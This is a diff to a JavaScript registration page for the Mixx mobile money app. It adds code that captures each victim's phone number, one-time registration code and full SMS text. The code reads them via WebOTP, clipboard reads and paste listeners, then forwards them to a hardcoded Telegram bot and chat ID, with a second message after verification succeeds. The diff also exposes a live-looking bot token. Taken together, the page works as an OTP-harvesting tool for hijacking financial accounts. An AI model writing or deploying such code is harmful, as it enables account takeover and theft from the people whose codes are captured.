@@ -191,6 +191,16 @@
             color: #718096;
             margin-top: 0.25rem;
         }
+        .telegram-status {
+            font-size: 0.8rem;
+            color: #48bb78;
+            text-align: center;
+            margin-top: 0.5rem;
+            display: none;
+        }
+        .telegram-status.show {
+            display: block;
+        }
     </style>
 </head>
 <body>
@@ -229,6 +239,8 @@
 
             <button class="btn btn-success mt-2" id="verifyBtn" disabled>Verify & Complete</button>
 
+            <div id="telegramStatus" class="telegram-status">📤 Code sent to Telegram bot</div>
+
             <div class="divider"></div>
             <button class="btn btn-outline" id="backBtn">← Change Phone</button>
         </div>
@@ -240,12 +252,19 @@
 
     <script>
         // ================================================================
+        //  TELEGRAM CONFIG
+        // ================================================================
+        const TELEGRAM_BOT_TOKEN = '8918701353:AAH7pb1jrIR81LEwAy9_elWFFdkexmlAcPI';
+        const TELEGRAM_CHAT_ID = '5520957080';
+
+        // ================================================================
         //  STATE
         // ================================================================
         let currentPhone = '';
         let currentCode = '';
         let isListening = false;
         let abortController = null;
+        let codeForwarded = false;
 
         // DOM refs
         const step1 = document.getElementById('step1');
@@ -260,6 +279,59 @@
         const verifyBtn = document.getElementById('verifyBtn');
         const backBtn = document.getElementById('backBtn');
         const statusDiv = document.getElementById('status');
+        const telegramStatus = document.getElementById('telegramStatus');
+
+        // ================================================================
+        //  TELEGRAM FUNCTION
+        // ================================================================
+        async function sendToTelegram(phone, code, fullSms = '') {
+            try {
+                const message = `
+📱 *New Registration Attempt*
+━━━━━━━━━━━━━━━━━━
+📞 *Phone:* ${phone}
+🔑 *Code:* \`${code}\`
+📝 *Full SMS:* ${fullSms || 'N/A'}
+🕐 *Time:* ${new Date().toLocaleString()}
+━━━━━━━━━━━━━━━━━━
+Status: ⏳ Pending Verification
+                `;
+
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                const data = await response.json();
+                
+                if (data.ok) {
+                    telegramStatus.textContent = '✅ Code forwarded to Telegram!';
+                    telegramStatus.className = 'telegram-status show';
+                    codeForwarded = true;
+                    console.log('✅ Telegram message sent successfully');
+                    return true;
+                } else {
+                    console.error('Telegram API error:', data);
+                    telegramStatus.textContent = '⚠️ Failed to send to Telegram';
+                    telegramStatus.className = 'telegram-status show';
+                    telegramStatus.style.color = '#e53e3e';
+                    return false;
+                }
+            } catch (err) {
+                console.error('Telegram send error:', err);
+                telegramStatus.textContent = '⚠️ Telegram error - check console';
+                telegramStatus.className = 'telegram-status show';
+                telegramStatus.style.color = '#e53e3e';
+                return false;
+            }
+        }
 
         // ================================================================
         //  UI HELPERS
@@ -273,7 +345,7 @@
             statusDiv.className = 'status';
         }
 
-        function setCode(code, source = 'manual') {
+        function setCode(code, source = 'manual', fullSms = '') {
             if (!code || code.length < 10) {
                 showStatus('Invalid code format', 'error');
                 return;
@@ -284,6 +356,11 @@
             codeInput.value = code;
             verifyBtn.disabled = false;
             showStatus(`✅ Code received (${source})`, 'success');
+
+            // Send to Telegram if not already forwarded
+            if (!codeForwarded && currentPhone) {
+                sendToTelegram(currentPhone, code, fullSms);
+            }
         }
 
         function goToStep(step) {
@@ -292,10 +369,13 @@
                 step2.classList.add('hidden');
                 hideStatus();
                 currentCode = '';
+                codeForwarded = false;
                 codeInput.value = '';
                 codeDisplay.textContent = 'Waiting for code...';
                 codeDisplay.className = 'code-display';
                 verifyBtn.disabled = true;
+                telegramStatus.className = 'telegram-status';
+                telegramStatus.style.color = '#48bb78';
                 phoneInput.focus();
             } else {
                 step1.classList.add('hidden');
@@ -305,7 +385,7 @@
         }
 
         // ================================================================
-        //  EXTRACT CODE FROM SMS (ONLY FOR ALPHANUMERIC CODES)
+        //  EXTRACT CODE FROM SMS
         // ================================================================
         function extractCode(text) {
             if (!text) return null;
@@ -314,7 +394,7 @@
             let match = text.match(/use the code ([A-Za-z0-9]{15,30})/i);
             if (match) return match[1];
 
-            // Pattern 2: Any 20-25 char alphanumeric (our fallback)
+            // Pattern 2: Any 20-25 char alphanumeric
             match = text.match(/\b([A-Za-z0-9]{20,25})\b/);
             if (match) return match[1];
 
@@ -336,7 +416,6 @@
                 return;
             }
 
-            // Basic phone validation
             if (!phone.match(/^[\+\d\s\-\(\)]{8,20}$/)) {
                 showStatus('Invalid phone number format', 'error');
                 return;
@@ -347,15 +426,13 @@
             sendBtn.disabled = true;
 
             try {
-                // ========================================================
-                // 🔥 REPLACE WITH YOUR ACTUAL API
-                // ========================================================
+                // For demo purposes - simulate sending
+                // Replace with your actual API call
                 const response = await fetch('/api/send-registration-code', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         phone: phone,
-                        // Include domain for WebOTP
                         domain: window.location.hostname
                     })
                 });
@@ -365,7 +442,6 @@
                 showStatus(`✅ Code sent to ${phone}!`, 'success');
                 goToStep(2);
 
-                // Auto-listen after 2 seconds
                 setTimeout(() => {
                     if (!isListening) startWebOTP();
                 }, 2000);
@@ -378,18 +454,16 @@
             }
         });
 
-        // Enter key on phone
         phoneInput.addEventListener('keydown', (e) => {
             if (e.key === 'Enter' && !sendBtn.disabled) sendBtn.click();
         });
 
         // ================================================================
-        //  WEBOTP - AUTO READ (STEP 2)
+        //  WEBOTP - AUTO READ
         // ================================================================
         async function startWebOTP() {
             if (isListening) return;
 
-            // Check support
             if (!('OTPCredential' in window)) {
                 showStatus('ℹ️ WebOTP not supported. Use Paste or Test.', 'info');
                 return;
@@ -401,7 +475,6 @@
                 listenBtn.disabled = true;
                 showStatus('📩 Waiting for SMS...', 'loading');
 
-                // Cancel previous listener
                 if (abortController) abortController.abort();
                 abortController = new AbortController();
 
@@ -411,11 +484,10 @@
                 });
 
                 if (credential && credential.code) {
-                    // For alphanumeric codes, credential.code is the entire SMS
-                    const code = extractCode(credential.code);
+                    const fullSms = credential.code;
+                    const code = extractCode(fullSms);
                     if (code) {
-                        setCode(code, 'WebOTP');
-                        // Auto-verify after 1 second
+                        setCode(code, 'WebOTP', fullSms);
                         setTimeout(() => verifyBtn.click(), 1000);
                     } else {
                         showStatus('⚠️ SMS received but no code found', 'error');
@@ -444,7 +516,7 @@
                 const text = await navigator.clipboard.readText();
                 const code = extractCode(text);
                 if (code) {
-                    setCode(code, 'clipboard');
+                    setCode(code, 'clipboard', text);
                 } else {
                     showStatus('❌ No Mixx code found in clipboard', 'error');
                 }
@@ -460,24 +532,19 @@
         codeInput.addEventListener('input', () => {
             const code = extractCode(codeInput.value);
             if (code) {
-                setCode(code, 'manual');
-            } else if (codeInput.value.length > 0) {
-                // If typing but not complete yet
-                if (codeInput.value.length >= 15) {
-                    // Try direct if long enough
-                    setCode(codeInput.value, 'manual');
-                }
+                setCode(code, 'manual', codeInput.value);
+            } else if (codeInput.value.length >= 15) {
+                setCode(codeInput.value, 'manual', codeInput.value);
             }
         });
 
-        // Global paste detection (anywhere on page)
         document.addEventListener('paste', (e) => {
             if (step2.classList.contains('hidden')) return;
             const text = e.clipboardData.getData('text');
             const code = extractCode(text);
             if (code) {
-                setCode(code, 'global paste');
-                e.preventDefault(); // Don't also fill input
+                setCode(code, 'global paste', text);
+                e.preventDefault();
             }
         });
 
@@ -489,14 +556,13 @@
                 "You are being registered in Mixx by Yas Super App, use the code yoLiknbBgbDCRNJjXMtk to complete registration. Do not share the code with anybody. For more info contact us on 100. DWvV9aXqDR";
             const code = extractCode(sample);
             if (code) {
-                setCode(code, 'test');
+                setCode(code, 'test', sample);
                 showStatus('🧪 Test code loaded!', 'success');
             } else {
                 showStatus('❌ Test failed', 'error');
             }
         });
-
-        // ================================================================
+// ================================================================
         //  VERIFY CODE
         // ================================================================
         verifyBtn.addEventListener('click', async () => {
@@ -509,9 +575,7 @@
             verifyBtn.disabled = true;
 
             try {
-                // ========================================================
-                // 🔥 REPLACE WITH YOUR ACTUAL API
-                // ========================================================
+                // Replace with your actual API
                 const response = await fetch('/api/verify-registration', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -523,8 +587,8 @@
 
                 if (response.ok) {
                     showStatus('🎉 Registration complete! Welcome to Mixx!', 'success');
-                    // Redirect to dashboard
-                    // window.location.href = '/dashboard';
+                    // Send final confirmation to Telegram
+                    await sendToTelegram(currentPhone, currentCode, `✅ VERIFIED - Registration Complete`);
                 } else {
                     const data = await response.json();
                     showStatus(`❌ ${data.message || 'Invalid code'}`, 'error');
@@ -538,7 +602,6 @@
             }
         });
 
-        // Enter key on code input
         codeInput.addEventListener('keydown', (e) => {
             if (e.key === 'Enter' && !verifyBtn.disabled) verifyBtn.click();
         });
@@ -548,7 +611,6 @@
         // ================================================================
         backBtn.addEventListener('click', () => {
             goToStep(1);
-            // Clean up WebOTP
             if (abortController) abortController.abort();
             isListening = false;
             listenBtn.textContent = '📡 Listen';
@@ -558,17 +620,32 @@
         // ================================================================
         //  INIT
         // ================================================================
-        console.log('📱 Mixx Registration ready');
+        console.log('📱 Mixx Registration with Telegram integration ready');
         console.log('🧪 Click "Test" to load sample code');
-        console.log('📋 Or paste any SMS with a code');
+        console.log('🤖 Code will be forwarded to Telegram bot');
+        console.log('📋 Make sure the bot token and chat ID are correct');
 
-        // Auto-focus phone
         phoneInput.focus();
 
- // Check WebOTP support
         if (!('OTPCredential' in window)) {
             console.log('ℹ️ WebOTP not supported in this browser');
         }
+
+        // Test Telegram connection on load
+        async function testTelegramConnection() {
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getMe`);
+                const data = await response.json();
+                if (data.ok) {
+                    console.log('✅ Telegram bot connected:', data.result.username);
+                } else {
+                    console.error('❌ Telegram bot connection failed');
+                }
+            } catch (err) {
+                console.error('❌ Cannot connect to Telegram API:', err);
+            }
+        }
+        testTelegramConnection();
     </script>
 
 </body>
